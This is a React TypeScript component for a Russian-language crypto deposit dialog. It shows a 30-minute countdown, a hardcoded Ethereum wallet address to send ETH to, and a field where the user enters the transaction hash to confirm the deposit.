import { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { CountdownTimer } from "@/components/CountdownTimer";

interface DepositConfirmationDialogProps {
  isOpen: boolean;
  onClose: () => void;
  amount: string;
  onConfirm: (hash: string) => void;
}

const DepositConfirmationDialog = ({
  isOpen,
  onClose,
  amount,
  onConfirm
}: DepositConfirmationDialogProps) => {
  const [transactionHash, setTransactionHash] = useState("");
  const walletAddress = "0xc68c825191546453e36aaa005ebf10b5219ce175";
  
  // Calculate end time (30 minutes from now)
  const endTime = new Date(new Date().getTime() + 30 * 60000).toISOString();

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Подтверждение депозита</DialogTitle>
          <DialogDescription className="space-y-4">
            <div className="mt-4">
              <CountdownTimer endTime={endTime} />
            </div>
            
            <div className="space-y-2 mt-4">
              <p>Пожалуйста, отправьте {amount} ETH на следующий адрес:</p>
              <div className="bg-muted p-2 rounded-md break-all font-mono">
                {walletAddress} (ERC-20)
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium">
                Hash транзакции
              </label>
              <Input
                value={transactionHash}
                onChange={(e) => setTransactionHash(e.target.value)}
                placeholder="Введите hash транзакции"
                className="font-mono"
              />
            </div>

            <Button 
              className="w-full" 
              onClick={() => onConfirm(transactionHash)}
              disabled={!transactionHash}
            >
              Подтверждение
            </Button>
          </DialogDescription>
        </DialogHeader>
      </DialogContent>
    </Dialog>
  );
};

export default DepositConfirmationDialog;